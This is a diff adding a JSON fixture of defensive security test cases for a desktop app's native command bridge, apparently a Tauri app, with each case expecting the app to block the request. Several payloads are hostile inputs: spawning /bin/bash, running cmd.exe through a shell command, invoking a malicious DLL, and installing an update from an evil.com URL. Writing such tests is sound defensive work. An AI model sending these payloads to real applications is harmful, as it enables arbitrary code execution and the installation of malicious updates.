@@ -1,0 +1,21 @@
+[
+  { "category": "NATIVE", "id": "NATIVE-001", "payload": "undeclared_native_command", "expected_error": "command_denied", "expected_event": "security.blocked" },
+  { "category": "NATIVE", "id": "NATIVE-001", "payload": "{\"cmd\": \"invoke_malicious_dll\"}", "expected_error": "command_denied", "expected_event": "security.blocked" },
+  
+  { "category": "NATIVE", "id": "NATIVE-002", "payload": "arbitrary_executable_or_url", "expected_error": "schema_rejection", "expected_event": "security.blocked" },
+  { "category": "NATIVE", "id": "NATIVE-002", "payload": "{\"cmd\": \"spawn_process\", \"executable\": \"/bin/bash\"}", "expected_error": "schema_rejection", "expected_event": "security.blocked" },
+  
+  { "category": "NATIVE", "id": "NATIVE-003", "payload": "generic_shell_or_process_request", "expected_error": "permission_denied", "expected_event": "security.blocked" },
+  { "category": "NATIVE", "id": "NATIVE-003", "payload": "{\"cmd\": \"tauri_shell_execute\", \"command\": \"cmd.exe\"}", "expected_error": "permission_denied", "expected_event": "security.blocked" },
+  
+  { "category": "NATIVE", "id": "NATIVE-004", "payload": "credential_backend_locked", "expected_error": "unauthorized_local", "expected_event": "security.blocked" },
+  { "category": "NATIVE", "id": "NATIVE-005", "payload": "credential_rotated_during_run", "expected_error": "none", "expected_event": "security.reconnected" },
+  { "category": "NATIVE", "id": "NATIVE-006", "payload": "host_exits_during_committed_work", "expected_error": "none", "expected_event": "system.recovery" },
+  { "category": "NATIVE", "id": "NATIVE-007", "payload": "update_requested_while_active", "expected_error": "update_conflict", "expected_event": "security.blocked" },
+  { "category": "NATIVE", "id": "NATIVE-008", "payload": "update_interrupted", "expected_error": "none", "expected_event": "system.rollback" },
+  
+  { "category": "NATIVE", "id": "NATIVE-009", "payload": "renderer_supplies_update_artifact", "expected_error": "unauthorized_action", "expected_event": "security.blocked" },
+  { "category": "NATIVE", "id": "NATIVE-009", "payload": "{\"cmd\": \"install_update\", \"url\": \"http://evil.com/update.zip\"}", "expected_error": "unauthorized_action", "expected_event": "security.blocked" },
+  
+  { "category": "NATIVE", "id": "NATIVE-010", "payload": "path_reused_after_renderer_reload", "expected_error": "registration_denied", "expected_event": "security.blocked" }
+]
